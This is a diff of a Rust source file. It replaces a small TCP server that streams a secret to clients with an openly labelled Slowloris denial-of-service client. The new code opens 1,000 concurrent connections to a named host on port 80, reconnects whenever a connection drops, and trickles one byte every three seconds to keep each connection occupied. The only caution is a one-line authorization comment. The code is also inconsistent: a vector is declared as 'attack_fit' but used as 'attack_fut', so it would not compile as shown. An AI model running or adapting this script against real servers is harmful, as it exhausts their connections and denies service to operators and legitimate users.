@@ -1,79 +1,68 @@
-/*
- * This file is part of the Shuttlecraft distribution (https://github.com/shuttlecraft).
- * Copyright (c) 2015 Aravinth Manivannan.
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, version 3.
- *
- * This program is distributed in the hope that it will be useful, but
- * WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
- * General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program. If not, see <http://www.gnu.org/licenses/>.
- */
+// My stupid slow loris based DoS client(?)
+// Don't use it on servers that you don't have authorization
+// Copyright (C) 2020  Aravinth Manivannan <realaravinth@batsense.net>
+//
+// This program is free software: you can redistribute it and/or modify
+// it under the terms of the GNU Affero General Public License as
+// published by the Free Software Foundation, either version 3 of the
+// License, or (at your option) any later version.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU Affero General Public License for more details.
+
+// You should have received a copy of the GNU Affero General Public License
+// along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 #![warn(rust_2018_idioms)]
 use pretty_env_logger;
 #[macro_use]
 extern crate log;
-#[macro_use]
-extern crate lazy_static;
 
 use tokio::io::AsyncWriteExt;
-use tokio::net::{TcpListener, TcpStream};
+use tokio::net::TcpStream;
 
-use futures::FutureExt;
-use std::env;
-use std::error::Error;
-
-lazy_static! {
-    static ref SECRET: String = env::var("CONN_RES_SECRET")
-        .expect("Please set CONN_RES_SECRET to the secret that you wish to send");
-}
-
-static MESSAGE: &[u8; 22] = b"You are buying me food";
+use futures::future;
 
 #[tokio::main]
-async fn main() -> Result<(), Box<dyn Error>> {
+async fn main() {
     pretty_env_logger::init();
-    let addr = env::var("PORT").expect("Please set PORT to the port that you wish to listen to");
+    let mut attack_fit = Vec::new();
 
-    let secret_bytes = SECRET.as_bytes();
+    info!("Creating futures");
 
-    info!("Listening on: http://0.0.0.0:{}", addr);
-    let mut listener = TcpListener::bind(format!("0.0.0.0:{}", addr)).await?;
-    loop {
-        while let Ok((inbound, _)) = listener.accept().await {
-            let transfer = transfer(inbound, &secret_bytes).map(|r| {
-                if let Err(e) = r {
-                    info!("Failed to transfer; error={}", e);
-                }
-            });
-
-            tokio::spawn(transfer);
-        }
+    for _ in 0..1_000 {
+        attack_fut.push(attack());
     }
+    info!("Created futures");
+    future::join_all(attack_fut).await;
 }
 
-async fn transfer(mut inbound: TcpStream, secret: &[u8]) -> Result<(), Box<dyn Error>> {
-    info!(
-        "{}",
-        inbound.peer_addr().map_err(|_| "Couldn't get address")?
-    );
-
-    info!("Sending stream");
-    for _ in 0..50_000 {
-        inbound.write(MESSAGE).await?;
+async fn get_conn() -> TcpStream {
+    let mut inbound = TcpStream::connect("stealth.batsense.net:80").await;
+    loop {
+        match &inbound {
+            Err(_) => {
+                inbound = TcpStream::connect("stealth.batsense.net:80").await;
+                continue;
+            }
+            Ok(_) => break,
+        }
     }
-    inbound.write(secret).await?;
+    inbound.unwrap()
+}
 
-    for _ in 0..50_000 {
-        inbound.write(MESSAGE).await?;
+async fn attack() {
+    use tokio::time::{sleep, Duration};
+    let mut inbound = get_conn().await;
+    let time = Duration::from_millis(3 * 1_000);
+    loop {
+        let message = "G".as_bytes();
+        match inbound.write(message).await {
+            Err(_) => inbound = get_conn().await,
+            _ => (),
+        };
+        sleep(time).await;
     }
-
-    info!("Connection reset");
-    Ok(())
 }
